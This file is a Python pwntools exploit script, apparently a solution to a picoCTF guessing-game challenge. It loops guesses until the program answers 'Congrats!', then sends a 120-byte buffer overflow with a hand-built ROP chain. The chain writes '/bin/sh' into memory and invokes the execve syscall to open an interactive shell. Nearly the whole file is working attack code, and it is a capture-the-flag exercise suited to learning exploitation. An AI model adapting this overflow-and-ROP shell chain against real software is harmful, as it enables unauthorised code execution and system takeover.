#!/usr/bin/env python
import pwn


def connect():
    # return pwn.connect("jupiter.challenges.picoctf.org", 51462)
    return pwn.process("./vuln")


def b(x):
    return x.to_bytes(8, "little")


io = connect()
count = 0
while True:
    count += 1
    io.recvuntil(b"What number would you like to guess?")
    io.sendline(b"1")
    io.recvline()
    resp = io.recvline()
    print(count, resp)
    if b"Congrats!" in resp:
        break

pop_rax = 0x00000000004163F4
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410CA3
pop_rdx = 0x000000000044CC26
write = 0x0000000000419127  # mov qword ptr [rdx], rax ; ret
syscall = 0x000000000040137C

offset = 120

payload = b"A" * offset

payload += b(pop_rax)
payload += b"/bin/sh\x00"
payload += b(pop_rdx)
payload += b(0x6B7000)
payload += b(write)

payload += b(pop_rax)
payload += b(0x3B)
payload += b(pop_rdi)
payload += b(0x6B7000)
payload += b(pop_rsi)
payload += b(0)
payload += b(pop_rdx)
payload += b(0)
payload += b(syscall)

io.sendline(payload)
io.interactive()
